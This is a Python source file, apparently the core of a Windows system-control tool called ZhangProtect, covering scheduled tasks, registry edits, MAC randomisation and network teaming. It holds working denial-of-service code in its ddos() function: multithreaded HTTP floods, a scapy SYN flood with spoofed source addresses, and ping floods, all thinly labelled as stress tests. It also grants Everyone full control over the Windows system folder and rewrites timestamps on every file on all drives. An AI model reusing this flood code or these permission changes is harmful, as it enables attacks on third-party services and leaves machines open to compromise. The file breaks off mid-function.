# ---正常模块导入---
import os
import gc
import re
import sys
import zlib
import time
import uuid
import base64
import psutil
import shutil
import config
import logger
import ctypes
import string
import struct
import socket
import random
import hashlib
import inspect
import win32api
import builtins
import win32net
import datetime
import requests
import powercfg
import win32gui
import win32con
import platform
import threading
import traceback
import smart_open
import subprocess
import reg_reader
import pywintypes
import await_tool
import win32console
import configparser
import win32security
import thread_monitor
import tkinter as tk
import Zhang_lan_scan
import Traffic_Killer
from version import *
import win32com.client
import encoding_safety
from queue import Queue
from pathlib import Path
from main_imports import *
from ctypes import wintypes
from configure_tags import *
import win32gui, win32process
from base64 import b64decode
from tkinter import messagebox
from scapy.sendrecv import send
from cmd_runner import RunWrapper
import xml.etree.ElementTree as ET
from scapy.layers.inet import TCP, IP
from multiprocessing import cpu_count

# ---正常模块导入---
# ---某些环境可能出错的模块导入---
try:
    import pythoncom

    pythoncom.CoInitialize()
except:
    pass
try:
    import wmi
except:
    pass
# ---某些环境可能出错的模块导入---
# ---base64携带的文件的导入---
from IDM import *
from uwd import *
from ntsd import *
from nmyu import *
from Fraps import *
from npcap import *
from icons import *
from rufus import *
from aria2 import *
from README import *
from NSudoL import *
from Speccy import *
from nircmd import *
from WinSCP import *
from iperf3 import *
from WinDbg import *
from ShareX import *
from WinHex import *
from PSTools import *
from BLESync import *
from cygwin1 import *
from nircmdc import *
from WizTree import *
from xorriso import *
from h2testw import *
from NetTime import *
from SnapShot import *
from CCleaner import *
from DeskDisp import *
from NSudoZip import *
from EfiGuard import *
from FastCopy import *
from PopBlock import *
from shexview import *
from UltraISO import *
from ByeByeJY import *
from libstdc6 import *
from XYplorer import *
from ArkTools import *
from PrivaZer import *
from VeraCrypt import *
from LocalSend import *
from MoveMouse import *
from Optimizer import *
from Autologon import *
from DesktopOK import *
from memreduct import *
from procexp64 import *
from DataLgloo import *
from FontTools import *
from RDPWrapZip import *
from ikun_sound import *
from Autoruns64 import *
from runas_user import *
from SetUserFTA import *
from TurboSwitch import *
from WeiWeiFontE import *
from MacManagere import *
from RestoreConf import *
from PingFangTTF import *
from SysDispatch import *
from APInstaller import *
from IconRemover import *
from awakekeeper import *
from Timesyncexe import *
from NewFileTime import *
from HuorongData import *
from NewTemplate import *
from KMSActivator import *
from shexview_lng import *
from file_servere import *
from ProcessLasso import *
from DontSleepexe import *
from DesktopGoose import *
from FreeFileSync import *
from zip7installer import *
from SetProToPcore import *
from DGuardInstall import *
from taskbar_hider import *
from iKun_icon_zip import *
from simplewallexe import *
from simplewalllng import *
from FuckKeyBoardZ import *
from LockHunterzip import *
from Disable_Safety import *
from ProcessMonitor import *
from BlueScreenView import *
from Auto_Lid_Sleep import *
from RegistryFinder import *
from AutoScreenshot import *
from Traffic_Killere import *
from WinRARinstaller import *
from Digital_Clock_4 import *
from NetworkGuardian import *
from TransparentIcon import *
from nvidiaopenglrdp import *
from ZhangGameRedDot import *
from keyboard_filter import *
from DefaultAppLocker import *
from ZhangKeyLauncher import *
from Zhang_lan_scan_e import *
from GameKeyBoardTools import *
from AutoDisplayConfig import *
from SystemInfoChanger import *
from Zhang_PE_Tool_exe import *
from install_wim_tweak import *
from BluetoothHFPGuard import *
from WifiMobileTool_exe import *
from libgcc_s_seh_1_dll import *
from ContextMenuManager import *
from Windows_Active_MAS import *
from StorageRedirectRes import *
from ZhangProtectPot_exe import *
from ZhangProtectControl import *
from Zhang_ip_helper_exe import *
from WindowDebugTool_exe import *
from NetworkGuardianSkill import *
from OpenHashTab_Installer import *
from NotepadPlus_Installer import *
from AutoPowerOptionsOKexe import *
from KasperskyDataRedirects import *
from KasperskyCFGTemplate import *
from format_changer_tool_exe import *
from AutoRemove_DRIVE_REMOVABLE import *


# ---base64携带的文件的导入---
def print_current_line():
    frame = inspect.currentframe()
    line_no = frame.f_lineno
    return f"当前行号为:{line_no}"


def del_bits(dir):
    for i in os.listdir(dir):
        try:
            path = os.path.abspath(dir + "\\" + i)
            if "_BITS_" in i or "url_fetcher" in i:
                shutil.rmtree(path)
        except:
            pass


def Create_All_Schtasks():
    global datadir
    logger.log("开始创建任务计划")
    # schtype 1 --> 每5分钟一次 ; 2 --> 登录时 ; 3 --> 系统启动时
    # Runlevel 1 --> 最高权限 ; 0 --> 普通权限
    Create_Schtasks("Protect", ProtectExe, "", "SYSTEM", 2, 1)
    Create_Schtasks("ProtectPot", ZhangProtectPot, "", "Users", 2, 1)
    Create_Schtasks("ProtectKeeper", ZhangProtectPot, "", "SYSTEM", 1, 1)
    Create_Schtasks(
        "AutoPreD", "cmd", f"/c {ProtectBAT} < {AutoAnswer}", "SYSTEM", 1, 1
    )
    Create_Schtasks("KeepWifi", "cmd", "/c powershell " + ProtectWifi, "SYSTEM", 1, 1)
    Create_Schtasks(
        "KeepWifi_Fast", "cmd", "/c powershell " + ProtectWifi, "SYSTEM", 2, 1
    )
    Create_Schtasks(
        "ReturnIcon",
        "cmd",
        "/c reg delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\DriveIcons /f",
        "SYSTEM",
        2,
        1,
    )
    Create_Schtasks(
        "Run_ON_Power_Troubleshooter",
        "cmd",
        f"/c {run_on_Power_Troubleshooter_bat}",
        "SYSTEM",
        5,
        1,
    )
    if os.path.isfile(AutoRemove_DRIVE_REMOVABLE_flag):
        Create_Schtasks(
            "AutoRemoveUDrivers",
            AutoRemove_DRIVE_REMOVABLE_exe,
            "",
            "SYSTEM",
            2,
            1,
        )
    else:
        Create_Schtasks(
            "AutoRemoveUDrivers",
            "disabled",
            "",
            "SYSTEM",
            2,
            1,
        )
    Create_Schtasks("UsbChanger", UsbChanger, "", "SYSTEM", 1, 1)
    Create_Schtasks("BatKeeperRun", BATKEEPER, "", "Users", 1, 1)
    Create_Schtasks(
        "MainTain_Mode",
        "mshta",
        f'vbscript:CreateObject("shell.application").shellexecute("cmd","/c if exist {datadir}:\\Files\\AutoCommand\\MainTain (start cmd.exe /c {Maintain_mode})","","runas",0)(window.close)',
        "Users",
        2,
        1,
    )
    Create_Schtasks("CCleaner-Auto", CCleanerExe, "/AUTO", "Users", 2, 1)
    logger.log("所有任务计划创建完毕")
    RunWrapper(
        "powershell -command \"Get-ScheduledTask -TaskPath '\\ZhangProtect\\*' | ForEach-Object { try { $task=$_; $_.Settings.ExecutionTimeLimit='PT0S'; $_.Settings.DisallowStartIfOnBatteries=$false; $_.Settings.StopIfGoingOnBatteries=$false; $_.Settings.StartWhenAvailable=$true; $_.Settings.Hidden=$false; $_.Settings.RestartCount=0; Set-ScheduledTask -InputObject $_; Write-Host '成功修改: '+$_.TaskName } catch { Write-Host '修改失败: '+$_.TaskName+' ('+$_+')' } }\""
    )
    return ""


def getmd5(file):
    m = hashlib.md5()
    with smart_open.smart_opens(file, "rb") as f:
        for line in f:
            m.update(line)
    md5code = m.hexdigest()
    return md5code


def get_pic(pic_code, pic_name):
    with smart_open.smart_opens(pic_name, "wb") as f:
        write_resource(f, pic_code)


def set_background_shell(target, command):
    try:

        def fresh_zhangProtect_Cho():
            for i in reg_reader.reg_read(background_reg_path)["Folders"]:
                if "ZhangProtect" in i["name"]:
                    reg_reader.reg_delete_key(f"{background_reg_path}\\{i['name']}")

        ZhangProtect_cho_path = f"{background_reg_path}\\ZhangProtect选项_0"
        if not os.path.isfile(enable_desktopmenu):
            fresh_zhangProtect_Cho()
            return
        reg_reader.reg_write(ZhangProtect_cho_path, "SubCommands", "reg_sz", "")
        reg_reader.reg_write(ZhangProtect_cho_path, "icon", "reg_sz", f"{ProtectExe},0")
        path1 = f"{ZhangProtect_cho_path}\\shell"
        try:
            num_test = reg_reader.reg_read(path1)["Folders"]
            if target in [i["name"] for i in num_test]:
                return
            num = len(num_test)
        except:
            num = 0
        if num >= 17:
            fresh_zhangProtect_Cho()
            return
        p = 1
        while num >= 16:
            path1 = background_reg_path + "\\ZhangProtect选项_%s" % p
            reg_reader.reg_write(path1, "SubCommands", "reg_sz", "")
            path1 += "\\shell"
            try:
                num = len(reg_reader.reg_read(path1)["Folders"])
            except:
                num = 0
                break
            p += 1
            if target in [i["name"] for i in reg_reader.reg_read(path1)["Folders"]]:
                return
        reg_reader.reg_write(f"{path1}\\{target}\\command", "", "reg_sz", command)
        reg_reader.reg_write(f"{path1}\\{target}", "icon", "reg_sz", f"{ProtectExe},0")
        reg_reader.reg_write(
            f"{background_reg_path}\\刷新ZhangProtect选项\\command",
            None,
            "reg_sz",
            f"{RestoreConf_exe} --restore_background_shell",
        )
        logger.log(f"成功设置桌面右键菜单:{target}")
    except Exception as e:
        logger.log(
            f"设置桌面右键菜单时出现错误:{target}-->{e}-->行:{e.__traceback__.tb_lineno}",
        )


def wait_task_run(TaskName, long=30):
    timeout = 0
    while not get_task_status(TaskName):
        time.sleep(1)
        timeout += 1
        if timeout > long:
            return False
    return True


def get_random_ip():  # 随机ip地址
    RANDOM_IP_POOL = ["53.69.51.198/0"]
    str_ip = RANDOM_IP_POOL[random.randint(0, len(RANDOM_IP_POOL) - 1)]
    str_ip_addr = str_ip.split("/")[0]
    str_ip_mask = str_ip.split("/")[1]
    ip_addr = struct.unpack(">I", socket.inet_aton(str_ip_addr))[0]
    mask = 0x0
    for i in range(31, 31 - int(str_ip_mask), -1):
        mask = mask | (1 << i)
    ip_addr_min = ip_addr & (mask & 0xFFFFFFFF)
    ip_addr_max = ip_addr | (~mask & 0xFFFFFFFF)
    return socket.inet_ntoa(struct.pack(">I", random.randint(ip_addr_min, ip_addr_max)))


def center_window(root, width, height):
    screenwidth = root.winfo_screenwidth()  # 获取显示屏宽度
    screenheight = root.winfo_screenheight()  # 获取显示屏高度
    size = "%dx%d+%d+%d" % (
        width,
        height,
        0,
        (screenheight - height) // 4,
    )  # 设置窗口居中参数
    root.geometry(size)  # 让窗口居中显示


def flagtest():
    global setflag
    if not setflag:
        exit(0)


def get_Identification_code():
    if os.path.isfile(disable_Winmgmt):
        return str(random.randrange(100000, 1000000))
    else:
        c = wmi.WMI()

        def get_disk_id():
            # # 硬盘序列号
            cc = ""
            for physical_disk in c.Win32_DiskDrive():
                # logger.log(physical_disk.SerialNumber)
                cc += physical_disk.SerialNumber
            return cc

        def get_cpu_id():
            # CPU序列号
            cc = ""
            for cpu in c.Win32_Processor():
                # logger.log(cpu.ProcessorId.strip())
                cc += cpu.ProcessorId.strip()
            return cc

        def get_motherboard_id():
            # 主板序列号
            cc = ""
            for board_id in c.Win32_BaseBoard():
                # logger.log(board_id.SerialNumber)
                cc += board_id.SerialNumber
            return cc

        def get_bios_id():
            # bios序列号
            cc = ""
            for bios_id in c.Win32_BIOS():
                # logger.log(bios_id.SerialNumber.strip())
                cc += bios_id.SerialNumber.strip()
            return cc

        def get_computer_id():
            try:
                str = (
                    get_disk_id() + get_cpu_id() + get_bios_id() + get_motherboard_id()
                )
            except:
                str = uuid.uuid4().hex
            return str

        md5 = hashlib.md5()
        byte_id = get_computer_id().encode()
        md5.update(byte_id)
        return str(zlib.crc32(md5.hexdigest().encode()))


def get_pro_user_num(exe):
    exe = str(exe).casefold()
    userlist = []
    for i in get_process_list():
        if i.get("name") == exe and not i.get("username") in userlist:
            userlist.append(i.get("username"))
    return len(userlist)


def create_script(file, text):
    try:
        with smart_open.smart_opens(
            file,
            "w",
        ) as f:
            f.write(text)
    except Exception as e:
        logger.log(
            str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
        )


def active_windows_process_name():  # 焦点窗口进程名regsvr32
    try:
        pid = win32process.GetWindowThreadProcessId(win32gui.GetForegroundWindow())
        return psutil.Process(pid[-1]).name()
    except Exception as e:
        logger.log(
            str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
        )


def active_windows_process_pid():  # 焦点窗口进程PID
    try:
        pid = win32process.GetWindowThreadProcessId(win32gui.GetForegroundWindow())
        return pid[-1]
    except Exception as e:
        logger.log(
            str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
        )


def ping(host):
    if not "http://" in host:
        host = "http://" + host
    try:
        requests.get(host, timeout=(1, 1))
        return True
    except:
        return False


def Get_Working_NetWork_Interfaces(all=False):
    # 获取正在工作的物理适配器或未参与负载均衡的物理适配器
    if os.path.isfile(disable_Winmgmt):
        return []
    else:
        ls = []
        nic_configs = wmi.WMI().Win32_NetworkAdapterConfiguration(IPEnabled=True)
        if all:
            nic_configs = wmi.WMI().Win32_NetworkAdapterConfiguration()
        for i in range(len(nic_configs)):
            try:
                int_k = nic_configs[i].Caption
                int_k = int_k.split("]")[0].split("[")[-1][4::]
                try:
                    test_reader = reg_reader.reg_read(
                        "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\class\\{4D36E972-E325-11CE-BFC1-08002BE10318}\\%s"
                        % int_k
                    )
                    for test_i in test_reader["keys"]:
                        if test_i["name"] == "Characteristics":
                            test = test_i["value"]
                            break
                    else:
                        continue
                except:
                    continue
                if int(test, 0) & 4 > 0:
                    try:
                        Nametest_reader = reg_reader.reg_read(
                            "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Network\\{4D36E972-E325-11CE-BFC1-08002BE10318}\\%s\\Connection"
                            % nic_configs[i].SettingID
                        )
                        for Name_test_i in Nametest_reader["keys"]:
                            if Name_test_i["name"] == "Name":
                                Name = Name_test_i["value"]
                                break
                        else:
                            continue
                    except:
                        continue
                    ls.append(
                        (
                            Name,
                            nic_configs[i].DefaultIPGateway,
                            nic_configs[i].IPAddress[0],
                        )
                    )
            except:
                pass
        if not len(ls) == 0:
            return ls


def RanDomChange_NetWorkAdapter_MAC():
    key_path = "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e972-e325-11ce-bfc1-08002be10318}"
    try:
        net_adapter_get = [i["name"] for i in reg_reader.reg_read(key_path)["Folders"]]
    except:
        return
    if os.path.isfile(RanDomMAC_Exclude_txt):
        with smart_open.smart_opens(
            RanDomMAC_Exclude_txt,
            "r",
        ) as f:
            RanDomMAC_Exclude = f.read().splitlines()
    else:
        with smart_open.smart_opens(
            RanDomMAC_Exclude_txt,
            "w",
        ) as f:
            f.write(
                "#写入本文件的网卡将在自动修改MAC时被忽略\n#请前往注册表 HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e972-e325-11ce-bfc1-08002be10318} 位置将想忽略的网卡对应的 DriverDesc 的数据值写到本文件内,一行一个"
            )
        RanDomMAC_Exclude = []

    def random_mac():
        ls = ["2", "6", "A", "E"]
        mac = [
            int(
                str(hex(random.randint(0x0, 0xF))).upper() + str(random.choice(ls)), 16
            ),
            random.randint(0x00, 0x7F),
            random.randint(0x00, 0x7F),
            random.randint(0x00, 0x7F),
            random.randint(0x00, 0xFF),
            random.randint(0x00, 0xFF),
        ]
        return "".join(map(lambda x: "%02x" % x, mac)).upper()

    for i in net_adapter_get:
        i = key_path + "\\" + i
        if "{4d36e972-e325-11ce-bfc1-08002be10318}" in i:
            Model_test = RunWrapper("reg query %s /v DriverDesc" % i).read()
            flag_a = True
            for j in RanDomMAC_Exclude:
                if not len(j) == 0:
                    if not j[0] == "#":
                        if j in Model_test:
                            logger.log(
                                "[自动MAC修改]跳过修改适配器并还原物理MAC:%s" % i
                            )
                            RunWrapper("reg delete %s /v NetworkAddress /f" % i)
                            flag_a = False
            if flag_a:
                macadd = random_mac()
                Phytest = RunWrapper("reg query %s /v DeviceInstanceID" % i).read()
                if "PCI\\" in Phytest or "USB\\" in Phytest:
                    logger.log("[自动MAC修改]修改适配器:%s" % i)
                    reg_reader.reg_write(i, "NetworkAddress", "REG_SZ", macadd)
                else:
                    logger.log("[自动MAC修改]此适配器不是物理适配器:%s" % i)
                    RunWrapper("reg delete %s /v NetworkAddress /f" % i)
                    reg_reader.reg_delete_key(i, "NetworkAddress")
    adapter_get = (
        RunWrapper(
            'powershell "$a=(Get-NetAdapter -Name \'*\');$b=$a.Name;$c=$a.InterfaceDescription;echo $b;echo "--------";echo $c"'
        )
        .read()
        .splitlines()
    )
    adapter_ls_num = adapter_get.index("--------")
    ls_a = adapter_get[0:adapter_ls_num]
    ls_b = adapter_get[adapter_ls_num + 1 : :]
    adapter_list = list(zip(ls_a, ls_b))
    logger.log("[自动MAC修改]获取到待重启适配器列表:%s" % adapter_list)
    for i in adapter_list:
        flag_b = True
        for j in RanDomMAC_Exclude:
            if not len(j) == 0:
                if not j[0] == "#":
                    if j in i[1]:
                        logger.log("[自动MAC修改]跳过重启适配器:%s" % i[0])
                        flag_b = False
        if flag_b:
            logger.log("[自动MAC修改]重启网络适配器:%s" % i[0])
            RunWrapper(
                "powershell \"Get-NetAdapter -Name '%s' | Restart-NetAdapter\"" % i[0]
            ).read()


def Remove_NetSwitchTeam():
    RunWrapper("powershell -command Remove-NetSwitchTeam -Name ZhangProtect").read()


def NetWorkAdapter_Load_Balance():
    if os.path.isfile(disable_Winmgmt):
        return
    else:
        # 调整所有网卡跃点数一致
        Error_num = 0
        logger.log(
            "[多网络适配器负载均衡]本程序仅能辅助设置负载均衡,并且存在不少问题,不能完全代替手动操作!本程序仅供测试,请确保您有处理问题的能力!",
        )
        while True:
            if Error_num > 10:
                logger.log(
                    "发生错误次数过多,本次运行将停用负载均衡,请正确配置网络适配器!",
                )
                Remove_NetSwitchTeam()
                return False
            url_txt = "network_test_url.txt"
            url = "www.baidu.com"
            if not os.path.isfile(url_txt):
                with smart_open.smart_opens(
                    url_txt,
                    "w",
                ) as f:
                    f.write(url)
            else:
                with smart_open.smart_opens(
                    url_txt,
                    "r",
                ) as f:
                    url = f.read()
            wg_list = []
            member_list = []
            Remove_NetSwitchTeam()
            whilt_time = 0
            while True:
                net_interfaces = psutil.net_if_addrs()
                interfaces = list(net_interfaces.keys())
                if not os.path.isfile(use_networkguard):
                    for i in interfaces:
                        RunWrapper(
                            'netsh interface ipv4 set interface "'
                            + str(i)
                            + '" metric=1'
                        )
                        RunWrapper(
                            'netsh interface ipv6 set interface "'
                            + str(i)
                            + '" metric=1'
                        )
                # 使用NetSwitchTeam实现负载均衡
                # 获取可用的物理网络适配器
                add_name_ls = []
                flag = False
                test = RunWrapper('powershell -command "Get-NetSwitchTeam').read()
                test_1 = ""
                # 如果已经存在组,获取当前组里的适配器
                if ": ZhangProtect" in test:
                    flag = True
                    test_1 = [
                        [
                            i
                            for i in RunWrapper(
                                'powershell -command "Get-NetSwitchTeam -name ZhangProtect"'
                            )
                            .read()
                            .splitlines()
                            if i.strip()
                        ][-1].split(":")[-1]
                    ]
                    for i in range(len(test_1)):
                        if test_1[i][0] == " ":
                            test_1[i] = test_1[i].replace(" ", "")
                    if "{" in test_1[0]:
                        test_1 = test_1[0][1:-1].split(",")
                Get_Info = Get_Working_NetWork_Interfaces()
                if not Get_Info == None:
                    for i in Get_Working_NetWork_Interfaces():
                        if i[1] == None:
                            continue
                        if (not i[1][0] in wg_list) and (not i[0] in test_1):
                            add_name_ls.append(i[0])
                            member_list.append(
                                (i[0], i[1][0], i[2]),
                            )
                            wg_list = [i[1] for i in member_list]
                # test_1为命令获取当前正在组中的适配器
                member_new = '"' + '","'.join(add_name_ls) + '"'
                if not member_new == '""':
                    if flag:
                        for i in add_name_ls:
                            RunWrapper(
                                'powershell -command Add-NetSwitchTeamMember -Team ZhangProtect -Name "%s"'
                                % i
                            ).read()
                            logger.log(
                                "[多网络适配器负载均衡]适配器组加入新成员:%s" % i
                            )
                            logger.log(
                                f"[多网络适配器负载均衡]当前适配器组成员列表(创建时状态):{member_list}",
                            )
                    else:
                        RunWrapper(
                            "powershell -command New-NetSwitchTeam -Name ZhangProtect -TeamMembers %s"
                            % member_new
                        ).read()
                        logger.log(
                            "[多网络适配器负载均衡]创建新适配器组,包含成员:%s"
                            % member_new,
                        )
                time.sleep(10)
                if not ping(url):
                    logger.log(
                        "[多网络适配器负载均衡]负载均衡状态联网异常,将刷新适配器组(联网测试Url:%s)"
                        % url,
                    )
                    Error_num += 1
                    break
                add_name_ls.clear()
                whilt_time += 1
                time.sleep(3)


def kill_exe(exe):
    try:
        for i in get_process_list():
            try:
                if i["execs"] == exe:
                    pro_name = i["name"]
                    if "." in pro_name:
                        pro_name = pro_name.split(".")[:-1]
                    RunWrapper(
                        'Taskkill /f /im "%s.exe" /t & powershell "Get-Process -Name %s | Stop-Process -Force"'
                        % (pro_name, pro_name)
                    )
            except Exception as e:
                logger.log(
                    str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
                )
    except Exception as e:
        logger.log(
            str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
        )


def ap_360_repair():
    global ap_360_exe
    logger.log("检查360AP状态")
    ap_360_exe = ""
    if os.path.isfile(use_36o_ap_flag) and not os.path.isfile(closewifi):
        RunWrapper(
            'Taskkill /f /im 360AP.exe /t & powershell "Get-Process -Name 360AP | Stop-Process -Force"'
        ).read()
        if os.path.isfile(ap_360_installer):
            RunWrapper("start /wait %s /s" % ap_360_installer).read()
            for i_360AP in get_process_list():
                try:
                    if i_360AP["name"] == "360AP.exe":
                        ap_360_exe = i_360AP["execs"]  # 360APMainProg
                        break
                except Exception as e:
                    logger.log(
                        str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
                    )
        RunWrapper(
            'Taskkill /f /im 360AP.exe /t & powershell "Get-Process -Name 360AP | Stop-Process -Force"'
        ).read()
        RunWrapper("schtasks /delete /f /tn 360safe\\360APMainProg")
    else:
        logger.log("未选中以360AP开启热点,不执行任何操作")
        return 0
    logger.log("获取到的360AP路径:%s" % ap_360_exe)
    if ap_360_exe == "":
        ap_360_exe = "C:\\Program Files (x86)\\360AP\\360AP.exe"
    logger.log("360AP准备完成:%s" % ap_360_exe)


def ddos(dosurl, flag, dosip):
    global qinstall, DDOSurl, logs

    def DDOSrandom():
        ranstr = ""
        for i in range(5, random.randrange(8, 20)):
            ranstr += random.choice(
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
            )
        return ranstr

    def DDOSki(dosurl, flag, DDOSProName):  # 目标Url,是否随机字符串入口(0为关其他为开)
        global qinstall, DDOSurl, logs
        numi = 1
        if str(flag) == "1":
            if not str(dosurl)[-1] == "/":
                dosurl += "/"
            while True:
                try:
                    requests.get(dosurl + str(DDOSrandom()))
                    numi += 1
                except Exception as e:
                    logger.log(
                        str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
                    )
                if numi % 1000 == 0:
                    logger.log(
                        "DDOS线程 "
                        + str(DDOSProName)
                        + " 第 "
                        + str(numi)
                        + " 次DDos压力测试已完成,未现错误(仅供学习参考,禁止用于非法用途)",
                    )
        else:
            while True:
                try:
                    requests.get(dosurl)
                    numi += 1
                except Exception as e:
                    logger.log(
                        str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
                    )
                if numi % 1000 == 0:
                    logger.log(
                        "DDOS线程 "
                        + str(DDOSProName)
                        + " 第 "
                        + str(numi)
                        + " 次DDos压力测试已完成,未现错误(仅供学习参考,禁止用于非法用途)",
                    )

    def synFlood(tgt, SYNProName):
        numj = 1
        while True:
            try:
                src = get_random_ip()
                for sport in range(1, 65535):
                    try:
                        IPlayer = IP(src=src, dst=tgt)
                        TCPlayer = TCP(sport=sport, dport=513)
                        pkt = IPlayer / TCPlayer
                        send(pkt)
                    except Exception as e:
                        logger.log(
                            str(sys.exc_info())
                            + "行:"
                            + str(e.__traceback__.tb_lineno),
                        )
                numj += 1
            except Exception as e:
                logger.log(
                    str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
                )
            if numj % 100 == 0:
                logger.log(
                    "SYN线程 "
                    + str(SYNProName)
                    + " 第 "
                    + str(numj)
                    + " 次SYN压力测试已完成,未现错误(仅供学习参考,禁止用于非法用途)",
                )

    def ping_test(ip):
        while True:
            try:
                CREATE_NO_WINDOW = 0x08000000
                subprocess.call(
                    "ping /l " + str(random.randrange(128, 65500)) + " /t " + ip,
                    creationflags=CREATE_NO_WINDOW,
                )
            except Exception as e:
                logger.log(
                    str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
                )

    for i in range(
        int(cpu_count()) * int(random.randrange(2, 8))
    ):  # 按照CPU核心数随机倍数开启多线程攻击测试
        threadingA = threading.Thread(
            target=DDOSki,
            name="DDOS压力测试线程" + str(i),
            args=(
                dosurl,
                flag,
                i,
            ),
        )
        threadingA.start()
        threadingB = threading.Thread(
            target=synFlood,
            name="SYN压力测试线程" + str(i),
            args=(
                dosip,
                i,
            ),
        )
        threadingB.start()
        threadingC = threading.Thread(
            target=ping_test,
            name="Ping压力测试线程" + str(i),
            args=(dosip,),
        )
        threadingC.start()


def makestart():
    try:
        if not os.path.exists(ProtectDir):
            RunWrapper(
                "cmd /c takeown /f %systemroot% /a & icacls %systemroot% /c /q /grant Everyone:(OI)(CI)(F)"
            )
            os.makedirs(ProtectDir)
            copy_files(selffullname, ProtectExe)
        if not os.path.isfile(ProtectExe):
            RunWrapper(
                "cmd /c takeown /f %systemroot% /a & icacls %systemroot% /c /q /grant Everyone:(OI)(CI)(F)"
            )
            copy_files(selffullname, ProtectExe)
    except Exception as e:
        logger.log(
            "错误",
            "复制文件时发生错误"
            + str(sys.exc_info())
            + "行:"
            + str(e.__traceback__.tb_lineno),
        )


def writing_conf(
    qinstall,
    UserBackA=None,
    UserBackB=None,
    UserBackC=None,
    UserBackD=None,
    UserBackE=None,
    UserBackF=None,
    UserBackG=None,
    UserBackH=None,
    UserBackI=None,
    UserBackJ=None,
    UserBackK=None,
):
    # 判断输入值是不是空的,是空的就给一个默认值,防止后面报错
    if not UserBackA or qinstall:
        UserBackA = "explorer.exe"
    if not UserBackB or qinstall:
        UserBackB = "echo."
    if not UserBackC or qinstall:
        UserBackC = "explorer.exe"
    if not UserBackD or qinstall:
        UserBackD = "echo."
    if not UserBackE or qinstall:
        UserBackE = "echo."
    if not UserBackF or qinstall:
        UserBackF = "None"
    if not UserBackG or qinstall:
        UserBackG = "C:\\ProgramData\\OnedriveTest"
    if not UserBackH or qinstall:
        UserBackH = "0"
    if not UserBackI or qinstall:
        UserBackI = "0"
    if not UserBackJ or qinstall:
        UserBackJ = "Windows-WiFi(1-8)-%s*12345678*1" % get_Identification_code()
    if not UserBackK or qinstall:
        UserBackK = "Disable"  # 测试目标主机
    # 如果配置文件已经存在就先删除,避免重复
    if os.path.isfile(Protectconf):
        os.remove(Protectconf)
    # 移动热点配置有效性校验
    wificonftest = UserBackJ.split("*")
    if (
        not ("*" in UserBackJ)
        or not (len(str(wificonftest[0])) in range(1, 24))
        or not (len(str(wificonftest[1])) in range(8, 16))
        or not (str(wificonftest[2]) in "012")
        or not (len(wificonftest) == 3)
    ):
        UserBackJ = "Windows-WiFi(1-8)-%s*12345678*1" % get_Identification_code()
    # 获取所有系统非系统盘符
    SystemC = SystemDir[:-1:].upper()
    PanList = get_local_drives(SystemC)  # 获取系统所有固定驱动器盘符
    try:
        PanList.remove(SystemC)
    except:
        pass
    NotSystemLetter = []
    for i in PanList:
        if os.access(i + ":", os.W_OK):
            NotSystemLetter.append(i)
    if '"' in UserBackB:
        UserBackB = UserBackB.replace('"', "'")
    if '"' in UserBackD:
        UserBackD = UserBackD.replace('"', "'")
    if '"' in UserBackE:
        UserBackE = UserBackE.replace('"', "'")
    if len(NotSystemLetter) == 0:
        RunWrapper(
            'mshta vbscript:Msgbox("设备没有更多可写分区可供作为数据区,若您后续开启重定向将额外占用系统分区空间")(window.close)'
        )
        NotSystemLetter.append(SystemC)
    # 规范化表达
    if UserBackG[-1] == "\\":
        UserBackG = UserBackG[:-1:]
    if UserBackF[-1] == ":":
        UserBackF = UserBackF[:-1:]
    DDOSconf = UserBackK.split("*")
    if not len(DDOSconf) == 3:
        if not UserBackK:
            UserBackK = "Disable"
    if not UserBackK == "Disable":
        try:
            with smart_open.smart_opens(npcap, "wb") as f:
                write_resource(f, npcapzip)
        except Exception as e:
            logger.log(
                str(sys.exc_info()) + "行:" + str(e.__traceback__.tb_lineno),
            )
    try:
        if not os.path.isdir(UserBackF + ":"):  # 指定的数据盘不存在就取第一个可用
            UserBackF = NotSystemLetter[0]
    except:
        UserBackF = NotSystemLetter[0]
    if not UserBackI == "1":
        var = UserBackI == "0"
    Writeini = (
        UserBackA
        + chr(10)
        + UserBackB
        + chr(10)
        + UserBackC
        + chr(10)
        + UserBackD
        + chr(10)
        + UserBackE
        + chr(10)
        + UserBackF
        + chr(10)
        + UserBackG
        + chr(10)
        + UserBackH
        + chr(10)
        + UserBackI
        + chr(10)
        + UserBackJ
        + chr(10)
        + UserBackK
        + chr(10)
    )
    Writeini += chr(10) + "#中文"
    with smart_open.smart_opens(
        Protectconf,
        "w",
    ) as f:
        f.write(Writeini)
    if not qinstall:
        messagebox.showinfo("完成", "配置保存成功")
    else:
        setflag = True


def change_all_filetime(change_system=False):
    systempath = os.getenv("systemdrive")[:-1]
    command = "\"Get-Childitem -path '%s:\\' -Recurse | foreach-object { $_.LastWriteTime ='01/01/3000 00:00:00' ; $_.CreationTime = '01/01/3000 00:00:00'; $_.LastWriteTime = '01/01/3000 00:00:00'  } 2>$null\""
    logger.log("文件时间修改:\n系统驱动器:%s" % systempath)
    for i in get_local_drives():
        if (not i == systempath) and os.path.exists("%s:\\" % i):
            if change_system:
                RunWrapper("powershell " + command % i)
                logger.log("创建线程修改驱动器下的所有文件时间:%s" % i)
            else:
                RunWrapper("powershell " + command % i).read()
                logger.log("修改驱动器下的所有文件时间:%s" % i)
    if change_system:
        logger.log("线程等待修改系统驱动器下的所有文件时间:%s" % systempath)
        RunWrapper("powershell " + command % systempath).read()


def application_install():
